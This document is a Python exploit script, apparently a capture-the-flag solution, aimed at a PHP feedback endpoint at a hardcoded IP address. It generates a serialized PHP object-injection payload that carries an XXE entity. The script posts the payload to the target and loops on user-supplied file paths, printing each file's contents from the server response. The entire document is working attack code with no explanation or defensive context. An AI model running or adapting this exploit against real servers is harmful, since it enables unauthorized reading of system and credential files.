import requests
from os import popen
from json import loads
from base64 import b64encode, b64decode

url = 'http://173.82.206.142:8002/feedback.php'

payload = """class Receiving{
    public $contents;
    public $function_name = 'toXML';
    private $key;
    private $key_cmp;
    private $feedback;

    function __construct($contents,$num,$class = null){
            $this->contents = $contents;
            $this->key = & $this->key_cmp;
            if($num == 2){
                $this->feedback = null;
            }else{
                $this->feedback = $class;
            }
    }
}
function payload(){
    $xml ='<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY xxe SYSTEM "file://%s">]>
<root>
<user>&xxe;</user>
<email>a@a.a</email>
<questions>Hello</questions>
<messages>DQV5</messages>
</root>';
       $ok = new Receiving($xml,2);
       $take = new Receiving('',1,$ok);
   echo base64_encode(json_encode(array(
            'status' => 'success',
            'content' => serialize($take),
            'timestamp' => time()
        )));
}
echo payload();
"""


def Exec(cmd):
    new = popen(cmd, "r")
    result = new.read()
    new.close()
    return result


def main():
    while 1:
        try:
            path = input("Path :> ")
            code = b64encode((payload % (path)).encode()).decode()
            data = Exec(
                """php -r "eval(base64_decode('""" + code + """'));" """)
            print("Payload => " + data)
            p = requests.post(url=url, data={'data': data}, headers={
                              'user-agent': 'ytoworld'})
            if(p.status_code == 200):
                text = '{' + p.text.split('}{')[1]
                text = loads(text)['contents'].split("Email from")[1].split(" Q ")[0].strip()
                print("\n" + text)

        except KeyboardInterrupt:
            print("Bye")
            break
        except Exception as e:
            print(e)
            pass
    pass


if __name__ == '__main__':
    main()
